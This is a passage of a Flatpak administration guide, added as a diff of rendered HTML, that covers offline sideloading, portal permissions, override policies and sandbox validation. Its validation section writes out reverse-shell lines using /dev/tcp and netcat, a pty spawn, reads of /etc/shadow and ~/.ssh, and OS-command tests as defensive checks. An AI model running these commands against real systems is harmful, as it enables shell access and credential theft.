+<span class="c1"># typically if you did not configure this already, even for flathub it will be blank.</span>
+<span class="c1"># this step is required for the correct metadata to be in the application when making the offline / local version</span>
+<span class="c1"># so that signature verification can still take place.</span>
+<span class="c1"># we can add this manually using the following:</span>
+flatpak<span class="w"> </span>remote-modify<span class="w"> </span>--collection-id<span class="o">=</span>org.flathub.Stable<span class="w"> </span>flathub
+</code></pre></div>
+<p>Next, get a copy of the remote repo's metadata and gpg signature.</p>
+<p>You'll want to do this if you are moving the application to an offline environment that doesn't already have the remote repo configured. Using the <code>flathub.flatpakrepo</code> file you can replicate the initial setup steps entirely offline.</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-LfO<span class="w"> </span>https://flathub.org/repo/flathub.flatpakrepo
+</code></pre></div>
+<p>Now create the offline / local copy of the application.</p>
+<p>This is simply a directory of the applicaiton data which can be moved around and installed from elsewhere. We'll create it in the current working directory for now.</p>
+<p><div class="highlight"><pre><span></span><code>flatpak<span class="w"> </span>create-usb<span class="w"> </span>.<span class="w"> </span>org.gnome.Recipes
+<span class="c1"># you&#39;ll see output explaining what&#39;s being written, and how much is left to write</span>
+
+<span class="c1"># check for the .ostree directory</span>
+ls<span class="w"> </span>-la
+
+total<span class="w"> </span><span class="m">12</span>
+drwxrwxr-x<span class="w"> </span><span class="m">3</span><span class="w"> </span>user<span class="w"> </span>user<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">18</span>:58<span class="w"> </span>.
+drwxrwxr-x<span class="w"> </span><span class="m">3</span><span class="w"> </span>user<span class="w"> </span>user<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">18</span>:58<span class="w"> </span>..
+drwxr-xr-x<span class="w"> </span><span class="m">3</span><span class="w"> </span>user<span class="w"> </span>user<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">18</span>:58<span class="w"> </span>.ostree
+</code></pre></div>
+<strong>TIP</strong>: Additionally, you can use <code>create-usb</code> in this exact same directory just like before, to add other applications to this <code>.ostree</code> repo.</p>
+<h3 id="installing-the-local-offline-application">Installing the Local / Offline Application</h3>
+<p>If the environment is completely offline and does not have the inital setup of remotes, be sure to use the <code>flathub.flatpak</code> file:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># must be done from a local repo search path, such as a mounted device prior to flatpak 1.8.0; we&#39;ll create one</span>
+sudo<span class="w"> </span>mkdir<span class="w"> </span>/media/<span class="nv">$USERNAME</span>/local
+sudo<span class="w"> </span>mount<span class="w"> </span>--bind<span class="w"> </span>/media/<span class="nv">$USERNAME</span>/local<span class="w"> </span>/media/<span class="nv">$USERNAME</span>/local
+sudo<span class="w"> </span>cp<span class="w"> </span>./flathub.flatpakrepo<span class="w"> </span>/media/<span class="nv">$USERNAME</span>/local
+<span class="nb">cd</span><span class="w"> </span>/media/<span class="nv">$USERNAME</span>/local
+
+sudo<span class="w"> </span>flatpak<span class="w"> </span>remote-add<span class="w"> </span>--if-not-exists<span class="w"> </span>flathub<span class="w"> </span>./flathub.flatpakrepo
+sudo<span class="w"> </span>flatpak<span class="w"> </span>remote-modify<span class="w"> </span>--collection-id<span class="o">=</span>org.flathub.Stable<span class="w"> </span>flathub
+
+sudo<span class="w"> </span>umount<span class="w"> </span>/media/<span class="nv">$USERNAME</span>/local
+sudo<span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/media/<span class="nv">$USERNAME</span>/local
+</code></pre></div>
+<h3 id="flatpak-180-or-later">Flatpak 1.8.0 or later</h3>
+<p>Flatpak searches these two directories...</p>
+<ul>
+<li><code>/run/flatpak/sideload-repos</code></li>
+<li><code>/var/lib/flatpak/sideload-repos</code></li>
+</ul>
+<p>...as local repos, looking for the <code>.ostree/repo</code> subdirectories within them.</p>
+<p>These locations can contain symlinks to the offline application's diectory.</p>
+<p>To create a temprorary local repo, use the /run location here:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># using /run/flatpak/sideload-repos:</span>
+sudo<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/run/flatpak/sideload-repos
+sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/run/flatpak/sideload-repos
+sudo<span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/path/to/&lt;local-repo&gt;<span class="w"> </span>/run/flatpak/sideload-repos/&lt;local-repo&gt;
+
+<span class="c1"># where /path/to/&lt;local-repo&gt; could look like: /media/user/flatpaklocal</span>
+<span class="c1"># making the symlink: /run/flatpak/sideload-repos/flatpaklocal</span>
+</code></pre></div>
+<p>If you want this to be persistent, use the /var location here:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># using /var/lib/flatpak/sideload-repos:</span>
+sudo<span class="w"> </span>mkdir<span class="w"> </span>/var/lib/flatpak/sideload-repos
+sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/var/lib/flatpak/sideload-repos
+sudo<span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/path/to/&lt;local-repo&gt;<span class="w"> </span>/var/lib/flatpak/sideload-repos/&lt;local-repo&gt;
+
+<span class="c1"># where /path/to/local/&lt;repo&gt; could look like: /media/user/flatpaklocal</span>
+<span class="c1"># making the symlink: /var/lib/flatpak/sideload-repos/flatpaklocal</span>
+</code></pre></div>
+<h3 id="flatpak-prior-to-180">Flatpak prior to 1.8.0</h3>
+<p>This didn't make sense until adding the <code>--ostree-verbose</code> argument to the install command (at the time of writing Flatpak 1.6.5).</p>
+<div class="highlight"><pre><span></span><code>flatpak<span class="w"> </span>install<span class="w"> </span>--ostree-verbose<span class="w"> </span>flathub<span class="w"> </span>org.gnome.Recipes
+
+<span class="c1"># reading the output showed the following line:</span>
+F:<span class="w"> </span>ostree_repo_finder_mount_resolve_async:<span class="w"> </span>Found<span class="w"> </span><span class="m">2</span><span class="w"> </span>mounts
+</code></pre></div>
+<p>After mounting the directory made for the local repo as a bind mount, flatpak immediately picked up the application.</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>mkdir<span class="w"> </span>/media/<span class="nv">$USERNAME</span>/flatpaklocal
+sudo<span class="w"> </span>mv<span class="w"> </span>.ostree<span class="w"> </span>-t<span class="w"> </span>/media/<span class="nv">$USERNAME</span>/flatpaklocal
+sudo<span class="w"> </span>mount<span class="w"> </span>--bind<span class="w"> </span>/media/<span class="nv">$USERNAME</span>/flatpaklocal<span class="w"> </span>/media/<span class="nv">$USERNAME</span>/flatpaklocal
+<span class="c1"># now the filesystem sees the local repo directory as a mounted device</span>
+</code></pre></div>
+<p>Lastly, install your application(s) as normal:</p>
+<div class="highlight"><pre><span></span><code>flatpak<span class="w"> </span>install<span class="w"> </span>flathub<span class="w"> </span>org.gnome.Recipes
+</code></pre></div>
+<p>Again, running <code>--ostree-verbose</code> with the install command will show the local repo is found, and signatures are verified.</p>
+<hr />
+<h2 id="explore-an-application-sandbox">Explore an Application Sandbox</h2>
+<p>Run another command within the security context of the application</p>
+<ul>
+<li>
+<p><a href="https://github.com/flatpak/flatpak/wiki/Sandbox#the-current-flatpak-sandbox">https://github.com/flatpak/flatpak/wiki/Sandbox#the-current-flatpak-sandbox</a></p>
+</li>
+<li>
+<p><a href="https://docs.flatpak.org/en/latest/debugging.html#running-debugging-tools">https://docs.flatpak.org/en/latest/debugging.html#running-debugging-tools</a></p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code># extremely useful for debugging and validating permission overrides
+flatpak run --command=bash org.gimp.GIMP
+</code></pre></div>
+<h3 id="file-chooser-portal-database">File-Chooser Portal / Database</h3>
+<p><a href="https://github.com/flatpak/flatpak/wiki/Portals#the-filechooser-portal">https://github.com/flatpak/flatpak/wiki/Portals#the-filechooser-portal</a></p>
+<p>The following commands will show you all permissions <strong>granted by the user</strong>, from GUI interaction with the portal mechanism (dialogues).</p>
+<ul>
+<li><a href="https://docs.flatpak.org/en/latest/debugging.html#inspecting-portal-permissions">https://docs.flatpak.org/en/latest/debugging.html#inspecting-portal-permissions</a></li>
+</ul>
+<p>This is described here: <a href="https://flatpak.github.io/xdg-desktop-portal/#gdbus-org.freedesktop.portal.FileChooser">https://flatpak.github.io/xdg-desktop-portal/#gdbus-org.freedesktop.portal.FileChooser</a></p>
+<div class="highlight"><pre><span></span><code># show permissions per app, or for all apps
+flatpak permissions
+flatpak permission-list
+flatpak permission-show org.gimp.GIMP
+
+# example output, testing portal permissions:
+Table      Object     App                    Permissions                  Data
+documents  546354f8   com.giuspen.cherrytree read,write,grant-permissions (b&#39;/etc/passwd&#39;, 2050, 131073, 0)
+documents  d82b71a9   com.giuspen.cherrytree read,write,grant-permissions (b&#39;/home/user/.ssh/id_rsa&#39;, 2050, 2490370, 0)
+documents  6c55c619   com.giuspen.cherrytree read,write,grant-permissions (b&#39;/boot/test.ctz.pdf&#39;, 2050, 262145, 0)
+documents  d5917d15   com.giuspen.cherrytree read,write,grant-permissions (b&#39;/etc/test.pdf&#39;, 2050, 131073, 0)
+documents  514101fb   com.giuspen.cherrytree read,write,grant-permissions (b&#39;/home/user/Documents/test&#39;, 2050, 262930, 0)
+documents  df008b13   com.giuspen.cherrytree read,write,grant-permissions (b&#39;/home/user/.gnupg/gpg.conf&#39;, 2050, 2493681, 0)
+
+# running reset will take away those permissions until you manually &#39;grant&#39; them again by manually selecting or opening those files via a dialogue.
+# this means until you revoke permission, you can access all of these files via a shell from within the application sandbox
+flatpak permission-reset com.giuspen.cherrytree
+
+Table      Object     App                    Permissions                  Data
+documents  546354f8                                                       (b&#39;/etc/passwd&#39;, 2050, 131073, 0)
+documents  d82b71a9                                                       (b&#39;/home/user/.ssh/id_rsa&#39;, 2050, 2490370, 0)
+documents  6c55c619                                                       (b&#39;/boot/test.ctz.pdf&#39;, 2050, 262145, 0)
+documents  d5917d15                                                       (b&#39;/etc/test.pdf&#39;, 2050, 131073, 0)
+documents  514101fb                                                       (b&#39;/home/user/Documents/test&#39;, 2050, 262930, 0)
+documents  df008b13                                                       (b&#39;/home/user/.gnupg/gpg.conf&#39;, 2050, 2493681, 0)
+</code></pre></div>
+<p>The above example was done with strict global overrides. This table shows every time a permission was manually granted by the user via a 'save as' style window when importing and exporting data with CherryTree.</p>
+<p>To see where copies of host files are made available to the sandbox, run <code>ls -l /run/user/1000/doc</code> to find folders relating to each object ID. This is the file-chooser portal's database, tracking all files accessed by sandboxed apps.</p>
+<hr />
+<h2 id="sandbox-overview">Sandbox Overview</h2>
+<p><a href="https://docs.flatpak.org/en/latest/basic-concepts.html#sandboxes">https://docs.flatpak.org/en/latest/basic-concepts.html#sandboxes</a></p>
+<p>Both the application and it's runtimes operate within the defined sandbox.</p>
+<p>Runtimes adhere to the permissions granted to the application itself.</p>
+<h3 id="sandbox-permissions">Sandbox Permissions</h3>
+<p>See this page for an overview of permissions:</p>
+<p><a href="https://docs.flatpak.org/en/latest/sandbox-permissions.html">https://docs.flatpak.org/en/latest/sandbox-permissions.html</a></p>
+<p>And this page for a complete reference:</p>
+<p><a href="https://docs.flatpak.org/en/latest/sandbox-permissions-reference.html">https://docs.flatpak.org/en/latest/sandbox-permissions-reference.html</a></p>
+<hr />
+<h3 id="d-bus-access">D-Bus Access</h3>
+<p>&lt;https://docs.flatpak.org/en/latest/sandbox-permissions.html#d-bus-access</p>
+<p>Applications exist in their own namespace, and typically do not need access beyond that.</p>
+<p>Media controls, for example, would be an exception (see the above link for details).</p>
+<h3 id="monitoring-d-bus">Monitoring D-Bus</h3>
+<p><a href="https://wiki.ubuntu.com/DebuggingDBus">https://wiki.ubuntu.com/DebuggingDBus</a></p>
+<p><a href="https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation.md">https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation.md</a></p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>d-feet<span class="w"> </span>gdbus
+
+<span class="c1"># monitor dbus session</span>
+dbus-monitor
+
+<span class="c1"># monitor system dbus session</span>
+<span class="c1"># see https://wiki.ubuntu.com/DebuggingDBus for configuration changes</span>
+sudo<span class="w"> </span>dbus-monitor<span class="w"> </span>--system
+
+<span class="c1"># or</span>
+sudo<span class="w"> </span>busctl<span class="w"> </span>monitor
+</code></pre></div>
+<h3 id="portals">Portals</h3>
+<p><a href="https://docs.flatpak.org/en/latest/sandbox-permissions.html#portals">https://docs.flatpak.org/en/latest/sandbox-permissions.html#portals</a></p>
+<p><a href="https://wiki.gnome.org/Design/Whiteboards/ApplicationSandboxing">https://wiki.gnome.org/Design/Whiteboards/ApplicationSandboxing</a></p>
+<p>Complete API reference:</p>
+<ul>
+<li><a href="https://flatpak.github.io/xdg-desktop-portal/">https://flatpak.github.io/xdg-desktop-portal/</a></li>
+</ul>
+<p>Portals handle the following actions, and require user interaction for the action to take place:</p>
+<ul>
+<li>Opening files with a native file chooser dialog</li>
+<li>Opening URIs</li>
+<li>Printing</li>
+<li>Showing notifications</li>
+<li>Taking screenshots</li>
+<li>Inhibiting the user session from ending, suspending, idling or getting switched away</li>
+<li>Getting network status information</li>
+</ul>
+<p>GTK3 and Qt5 have support for portals built-in, while applications not using either can refer to this documentation:</p>
+<ul>
+<li><a href="https://flatpak.github.io/xdg-desktop-portal/portal-docs.html">https://flatpak.github.io/xdg-desktop-portal/portal-docs.html</a></li>
+</ul>
+<p>From the portal docs:</p>
+<div class="highlight"><pre><span></span><code>The FileChooser portal allows sandboxed applications to ask the user for access to files outside the sandbox.
+The portal backend will present the user with a file chooser dialog.
+
+The selected files will be made accessible to the application via the document portal,
+and the returned URI will point into the document portal fuse filesystem in /run/user/$UID/doc/.
+
+This documentation describes version 3 of this interface.
+</code></pre></div>
+<p>If you run <code>ls -l /run/user/1000/doc</code> you'll find the fusefs entries for each object ID in <code>flatpak permission-show</code>. This is where permitted files are copied so that the sandbox may access them while still keeping the host [files] shielded.</p>
+<hr />
+<p>When reviewing and validating the boundaries of the security sandbox, one thing that can be confusing is when a portal transparently opens nautilus (or your system's file viewer) in an unrestricted context, when other times it may not be using a portal, and will adhere to the permissions / overrides you'd expect.</p>
+<p>We'll use nautilus as an example, it is a common filesystem browser utility (like windows explorer). The process can be spawned simply by opening your folder application.</p>
+<p>What to look for is when a portal is used, you will be able to traverse your entire filesystem as nautilus may not be sandboxed in the same way your flatpak app is.</p>
+<p>The CherryTree (flatpak) has a few options under File &gt; Export:</p>
+<ul>
+<li>Export to plain text<ul>
+<li>Select any additional options from here, but notice you're confined to browsing only within the defined filesystem sandbox boundaries in this prompt</li>
+</ul>
+</li>
+<li>Export to [option]<ul>
+<li>Any of the other options here allow you to fully traverse the filesystem outside of the sandbox since this is a portal, a separate process.</li>
+<li>Choose to save a document outside of the sandbox</li>
+<li>Running <code>flatpak permission-show com.giuspen.cherrytree</code> will show every location accessed outside of the sandbox via portals.</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h2 id="user-defined-permissions-flatpak-override">User Defined Permissions (flatpak override)</h2>
+<p>Modify the application's sandbox and permissions.</p>
+<h3 id="global-overrides">Global Overrides</h3>
+<p>Users can define a global override policy, for example:</p>
+<p><div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>flatpak<span class="w"> </span>override<span class="w"> </span>--nofilesystem<span class="o">=</span>host
+
+flatpak<span class="w"> </span>override<span class="w"> </span>--show
+
+<span class="o">[</span>Context<span class="o">]</span>
+<span class="nv">filesystems</span><span class="o">=</span>!host<span class="p">;</span>
+</code></pre></div>
+This will prevent <strong>all</strong> flatpak applications from accessing the host filesystem unrestricted.</p>
+<p>This can be ideal, as many applications come with unrestricted 'host' enabled by default ('host' meaning all non-system files are accessible to the app).</p>
+<p>The following is one approach, using a global 'deny all', then allowing only what's necessary in an application's specific overrides:</p>
+<h3 id="system-wide-overrides">System-Wide Overrides:</h3>
+<p><code>/var/lib/flatpak/overrides/global</code></p>
+<div class="highlight"><pre><span></span><code>[Context]
+filesystems=!host;
+shared=!network;!ipc;
+
+[Session Bus Policy]
+org.gtk.vfs.*=none
+org.gtk.vfs=none
+</code></pre></div>
+<h3 id="a-note-on-gvfs">A Note On gvfs</h3>
+<p>According to this, applications should not be using <code>org.gtk.vfs</code> in their permissions.</p>
+<p><a href="https://docs.flatpak.org/en/latest/sandbox-permissions.html#gvfs-access">https://docs.flatpak.org/en/latest/sandbox-permissions.html#gvfs-access</a></p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>flatpak<span class="w"> </span>override<span class="w"> </span>--no-talk-name<span class="o">=</span><span class="s2">&quot;org.gtk.vfs&quot;</span>
+sudo<span class="w"> </span>flatpak<span class="w"> </span>override<span class="w"> </span>--no-talk-name<span class="o">=</span><span class="s2">&quot;org.gtk.vfs.*&quot;</span>
+</code></pre></div>
+<h3 id="application-level-overrides">Application Level Overrides:</h3>
+<p><code>/var/lib/flatpak/overrides/org.gimp.GIMP</code></p>
+<div class="highlight"><pre><span></span><code>[Context]
+filesystems=~/snap/flatpakaccess/gimp:create;
+
+[Session Bus Policy]
+org.freedesktop.FileManager1=none
+</code></pre></div>
+<p><a href="https://github.com/flatpak/flatpak/issues/4643">https://github.com/flatpak/flatpak/issues/4643</a></p>
+<h3 id="runtimes-and-sandboxing">Runtimes and Sandboxing</h3>
+<ul>
+<li>
+<p><a href="https://github.com/flatpak/flatpak/wiki/Metadata#runtime-metadata">https://github.com/flatpak/flatpak/wiki/Metadata#runtime-metadata</a></p>
+</li>
+<li>
+<p><a href="https://docs.flatpak.org/en/latest/basic-concepts.html#sandboxes">https://docs.flatpak.org/en/latest/basic-concepts.html#sandboxes</a></p>
+</li>
+</ul>
+<p>Each sandbox contains an application and its runtime.</p>
+<p>Same as for applications it is possible to override environment variables for entire runtimes. The overrides for runtime environment variables are applied before application overrides, so if both runtime and application override the same environment variable, the value within the application metadata file wins.</p>
+<p><strong>Global overrides cover both, applications and their runtimes</strong>.</p>
+<hr />
+<p>To view an applications default permissions, find the <code>metadata</code> file:</p>
+<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/var/lib/flatpak/<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;metadata&quot;</span><span class="w"> </span>-ls
+
+cat<span class="w"> </span>/var/lib/flatpak/app/&lt;app-name&gt;/path/to/metadata
+</code></pre></div>
+<h3 id="the-override-command">The Override Command</h3>
+<p>To modify the default permissions of an application, use the <code>override</code> command.</p>
+<p><a href="https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=manaing%20portal%20permissions#flatpak-override">https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=manaing%20portal%20permissions#flatpak-override</a></p>
+<p><code>flatpak override [OPTION...] [APP] - Override settings [for application]</code></p>
+<p>The <code>--[option]=VALUE</code> has tab completion for the VALUE.</p>
+<div class="highlight"><pre><span></span><code>flatpak<span class="w"> </span>override<span class="w"> </span>--nosocket<span class="o">=</span>wayland<span class="w"> </span>org.gnome.gedit
+
+flatpak<span class="w"> </span>override<span class="w"> </span>--filesystem<span class="o">=</span>home<span class="w"> </span>org.mozilla.Firefox
+
+sudo<span class="w"> </span>flatpak<span class="w"> </span>override<span class="w"> </span>--unshare<span class="o">=</span>network<span class="w"> </span>org.gimp.GIMP
+</code></pre></div>
+<p>Taking the following steps should result in no network access for the application:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>flatpak<span class="w"> </span>override<span class="w"> </span>--unshare<span class="o">=</span>network<span class="w"> </span>org.gimp.GIMP
+
+<span class="c1"># overrides policy at /var/lib/flatpak/overrides/org.gimp.GIMP</span>
+
+flatpak<span class="w"> </span>override<span class="w"> </span>--show<span class="w"> </span>org.gimp.GIMP
+
+<span class="c1"># [Context]</span>
+<span class="c1"># shared=!network;</span>
+
+flatpak<span class="w"> </span>run<span class="w"> </span>--command<span class="o">=</span>bash<span class="w"> </span>org.gimp.GIMP
+
+curl<span class="w"> </span>https://google.com:443
+<span class="c1">#   curl: (7) Couldn&#39;t connect to server</span>
+
+sudo<span class="w"> </span>flatpak<span class="w"> </span>override<span class="w"> </span>--reset<span class="w"> </span>org.gimp.GIMP
+
+flatpak<span class="w"> </span>override<span class="w"> </span>--show<span class="w"> </span>org.gimp.GIMP
+<span class="c1"># this should now return an empty result</span>
+</code></pre></div>
+<p>Next try removing access to a specific directory:</p>
+<p><strong>NOTE</strong>: FILESYSTEM can be one of (This option can be used multiple times):
+- home
+- host
+- host-os
+- host-etc
+- xdg-desktop
+- xdg-documents
+- xdg-download
+- xdg-music
+- xdg-pictures
+- xdg-public-share
+- xdg-templates
+- xdg-videos
+- an absolute path
+- or a homedir-relative path like ~/dir</p>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;user:pass&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>~/Music/pass.txt
+
+sudo<span class="w"> </span>flatpak<span class="w"> </span>override<span class="w"> </span>--nofilesystem<span class="o">=</span>~/Music<span class="w"> </span>org.gimp.GIMP
+
+ls<span class="w"> </span>-l<span class="w"> </span>~/Music/
+
+<span class="c1"># total 4</span>
+<span class="c1"># -rw-rw-r-- 1 user user 10 Apr 2 00:00 pass.txt</span>
+
+flatpak<span class="w"> </span>run<span class="w"> </span>--command<span class="o">=</span>bash<span class="w"> </span>org.gimp.GIMP
+
+ls<span class="w"> </span>-l<span class="w"> </span>~/Music/
+
+<span class="c1"># total 0</span>
+</code></pre></div>
+<p>Note that with <code>--filsystem=host</code> flatpak remounts the host's <code>/etc/*</code> folder under <code>/var/run/host/etc/*</code> within the sandbox, meaning those files are all still there, just as a read-only tmpfs.</p>
+<p>Another interesting exercise is when running both snap packages and flatpak apps on the same system, they don't necessarily respect all of the other's default access controls.</p>
+<p>For example, snaps typically cannot read other snap's directories, or any directory you may create under ~/snap (ignoring the other /snap and /tmp/snap* directories for now, though they too are read / write protected).</p>
+<p>We'll use an example where we need to install GIMP on a workstation, where all of the other applications are installed and managed through snapd.</p>
+<p>We can integrate GIMP on a system like that with this:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>flatpak<span class="w"> </span>override<span class="w"> </span>--nofilesystem<span class="o">=</span>host<span class="w"> </span>org.gimp.GIMP
+
+sudo<span class="w"> </span>flatpak<span class="w"> </span>override<span class="w"> </span>--filesystem<span class="o">=</span>~/snap/flatpakaccess/gimp:create<span class="w"> </span>org.gimp.GIMP
+
+cat<span class="w"> </span>/var/lib/flatpak/overrides/org.gimp.GIMP
+
+<span class="c1"># [Context]</span>
+<span class="c1"># filesystems=!host;~/snap/flatpakaccess/gimp:create;</span>
+
+flatpak<span class="w"> </span>run<span class="w"> </span>org.gimp.GIMP
+</code></pre></div>
+<p>This allows:</p>
+<ul>
+<li>A folder of <code>~/snap/flatpakaccess/gimp</code> to be created (if it doesn't exist) and written to.</li>
+<li>GIMP to save it's data to a <code>~/snap</code> directory, preventing other snaps from reading those files.</li>
+<li>GIMP cannot see anything outside of it's own sandboxed application directory (a tmpfs mount), and the snap directory assigned to it via the override.<ul>
+<li>This view of the filesystem is extremely limited, you can examine the sandbox with <code>flatpak run --command=bash org.gimp.GIMP</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="validating-permissions">Validating Permissions</h2>
+<p>This is a quick reference of how to validate your application is adhering to the correct permissions:</p>
+<div class="highlight"><pre><span></span><code>flatpak<span class="w"> </span>run<span class="w"> </span>--command<span class="o">=</span>bash<span class="w"> </span>&lt;application-name&gt;
+</code></pre></div>
+<p>You now have a shell in the context of the application's security sandbox.</p>
+<p>Try to access protected items or make remote connections:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>-l
+cat<span class="w"> </span>/etc/shadow
+curl<span class="w"> </span>https://google.com
+nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">8080</span>
+<span class="nb">command</span><span class="w"> </span>-v<span class="w"> </span>pkexec
+ls<span class="w"> </span>-l<span class="w"> </span>/tmp/snap.&lt;snap-pacakge&gt;
+ls<span class="w"> </span>-laR<span class="w"> </span>~/.gnupg
+find<span class="w"> </span>~/.ssh<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-ls
+</code></pre></div>
+<p>You'll see if you follow along in <code>wireshark</code>, <code>tcpdump</code>, <code>tshark</code> or similar, the connection is never made -- no packets will leave the host. More specifically, no packets leave the sandbox.</p>
+<p>Try to breakout with a simple shell:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/etc/shadow
+</code></pre></div>
+<p>Try to create an http server (it should actually succeed here, but only exists within the sandbox and is not visible by the host):</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8080</span><span class="w"> </span>--bind<span class="w"> </span><span class="m">127</span>.0.0.1<span class="p">;</span>
+<span class="c1"># in another terminal on the host, try (this should fail):</span>
+curl<span class="w"> </span>http://127.0.0.1:8080
+<span class="c1"># see if it&#39;s visible to the host, it should not be visible or accessible from outside of the sandbox</span>
+netstat<span class="w"> </span>-antup
+</code></pre></div>
+<p>Try another breakout</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># https://github.com/carlospolop/hacktricks/blob/master/linux-unix/useful-linux-commands/bypass-bash-restrictions.md</span>
+<span class="c1"># setup a listener outside the security sandbox on the host</span>
+nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">4400</span><span class="w"> </span>-s<span class="w"> </span><span class="m">127</span>.0.0.1
+<span class="c1"># from within the sandbox try:</span>
+<span class="o">(</span>sh<span class="o">)</span><span class="m">0</span>&gt;/dev/tcp/127.0.0.1/4400
+<span class="c1"># it should fail if shared=!network is set</span>
+<span class="c1"># it should also fail even if you try to reach the host machine&#39;s local network address</span>
+<span class="c1"># if it doesn&#39;t fail, you&#39;ll get the following:</span>
+Connection<span class="w"> </span>received<span class="w"> </span>on<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">40864</span>
+<span class="c1"># in that window, enter this to complete the breakout:</span>
+<span class="nb">exec</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">0</span>
+</code></pre></div>
+<p>Try to execute OS commands with python:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.system(&quot;/usr/bin/whoami&quot;)&#39;</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.system(&quot;/usr/bin/sudo -l&quot;)&#39;</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.system(&quot;/usr/bin/nc -nvlp 4000&quot;)&#39;</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.system(&quot;/usr/bin/curl http://172.20.111.1&quot;)&#39;</span>
+
+sh-5.1$<span class="w"> </span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.system(&quot;(sh)0&gt;/dev/tcp/172.20.111.1:443&quot;)&#39;</span>
+sh:<span class="w"> </span>line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>/dev/tcp/172.20.111.1:443:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory
+</code></pre></div>
+<p>Another intersting way to view activity is in the system IO, with <code>pspy</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># on the host outside of the sandbox:</span>
+<span class="c1"># replace pspy64 with pspy32 if on x86</span>
+curl<span class="w"> </span>-sSLO<span class="w"> </span><span class="s1">&#39;https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64&#39;</span>
+sha256sum<span class="w"> </span>./pspy64<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;f7f14aa19295598717e4f3186a4002f94c54e28ec43994bd8de42caf79894bdb&#39;</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>./pspy64
+./pspy64
+</code></pre></div>
+<p>This will show you commandline information of all running processes including flatpak applications.</p>
+<p>Try running your flatpak app again with <code>--command=bash</code> and see what commands you can pick up with <code>pspy</code> running in another window.</p>
+<hr />
+<p>One final exercise, in looking for files that applications typically create in a <code>/tmp</code> directory, but are now being created within the container, rendered no results with <code>sudo find / -type &lt;type&gt; -name "&lt;regex&gt;" -ls 2&gt;/dev/null</code></p>
+<p>However these files can be seen from within the container when using the <code>flatpak run --command=bash org.example.app</code></p>
+<p>Where exactly is this location from the context of the host?</p>
+<p>Oddly enough, Sysmon (for Linux) can see these files being created / deleted by applications in a sandbox:</p>
+<div class="highlight"><pre><span></span><code>Event SYSMONEVENT_FILE_CREATE
+    RuleName: -
+    UtcTime: 2022-04-05 01:02:03.998
+    ProcessGuid: {abcd1234-1234-aabb-ccdd-0000000000}
+    ProcessId: 142327
+    Image: /newroot/app/var/lib/flatpak/app/org.example.app/x86_64/stable/abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789/files/bin/example
+    TargetFilename: /newroot/tmp/.ZLX123/file.txt
+    CreationUtcTime: 2022-04-05 01:02:03.998
+</code></pre></div>
+<p>Looking for <code>/newroot</code> online leads to this commit, closing issue #305, showing that the default mount point is <code>/tmp/newroot</code>, updated from previous paths that were used.</p>
+<ul>
